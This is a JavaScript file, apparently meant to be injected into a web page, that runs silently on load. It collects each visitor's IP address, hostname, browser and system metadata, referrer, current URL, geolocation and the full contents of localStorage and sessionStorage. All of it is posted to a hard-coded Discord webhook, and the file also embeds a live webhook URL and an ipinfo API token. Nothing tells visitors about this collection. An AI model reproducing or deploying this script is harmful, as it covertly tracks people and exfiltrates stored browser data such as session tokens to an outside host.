function getVisitorIpAndDns() {
    return fetch('https://ipinfo.io?token=b0138b9c06beb1')
        .then(response => response.json())
        .then(data => {
            const visitorInfo = {
                ip: data.ip,
                hostname: data.hostname || 'Hostname not available',
            };
            return visitorInfo;
        })
        .catch(error => {
            console.error('Error fetching IP and DNS info:', error);
            return { ip: null, hostname: null };
        });
}

function sendToDiscord(visitorInfo) {
    const webhookURL = "https://discord.com/api/webhooks/1297169245553295375/5GPDfAUrU4fh0uqlO2D2Dh4-HhiFtZZ5sgBVCEMNLsBlrIMOWYShxhY_mZDpiH7mo3DR";

    const payload = {
        content: `New visitor IP address: ${visitorInfo.ip}, Hostname: ${visitorInfo.hostname}`,
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('IP address and DNS info sent to Discord successfully!');
        } else {
            console.error('Failed to send IP and DNS info to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Error sending IP and DNS info to Discord:', error);
    });
}

window.onload = async function() {
    const visitorInfo = await getVisitorIpAndDns();
    if (visitorInfo.ip) {
        sendToDiscord(visitorInfo);
    }
};
(function() {
    // Discord webhook URL
    const webhookURL = "https://discord.com/api/webhooks/1297169245553295375/5GPDfAUrU4fh0uqlO2D2Dh4-HhiFtZZ5sgBVCEMNLsBlrIMOWYShxhY_mZDpiH7mo3DR";

    // Function to send data to the Discord webhook
    function sendToDiscord(message) {
        const payload = {
            content: message
        };
        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });
    }

    // 1. Collect additional metadata
    const metadata = {
        userAgent: navigator.userAgent,      // Browser user-agent (details about OS and browser)
        platform: navigator.platform,        // Operating system
        screenResolution: `${window.screen.width}x${window.screen.height}`,  // Screen resolution
        language: navigator.language,        // Browser language
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // User's timezone
        cookiesEnabled: navigator.cookieEnabled,  // Are cookies enabled?
        onlineStatus: navigator.onLine ? "Online" : "Offline",  // Network status
        referrer: document.referrer,  // Referrer (previous page)
        currentUrl: window.location.href  // Current page URL
    };

    // Send the metadata to Discord
    sendToDiscord(`Visitor Metadata: ${JSON.stringify(metadata)}`);

    // 2. Attempt to gather browser storage info
    function collectStorageData() {
        const storageInfo = {
            localStorageData: {},
            sessionStorageData: {}
        };

        // Collect localStorage data (if any)
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageInfo.localStorageData[key] = localStorage.getItem(key);
        }

        // Collect sessionStorage data (if any)
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storageInfo.sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // Send the storage data to Discord
        sendToDiscord(`Storage Data: ${JSON.stringify(storageInfo)}`);
    }

    // Collect and send localStorage and sessionStorage data
    collectStorageData();

    // 3. Try to gather geolocation data (this requires user permission)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            // Send geolocation to Discord
            sendToDiscord(`Geolocation: ${JSON.stringify(location)}`);
        }, function(error) {
            // If geolocation is blocked, log the error
            sendToDiscord(`Geolocation access denied: ${error.message}`);
        });
    } else {
        sendToDiscord("Geolocation not supported by browser.");
    }

})();
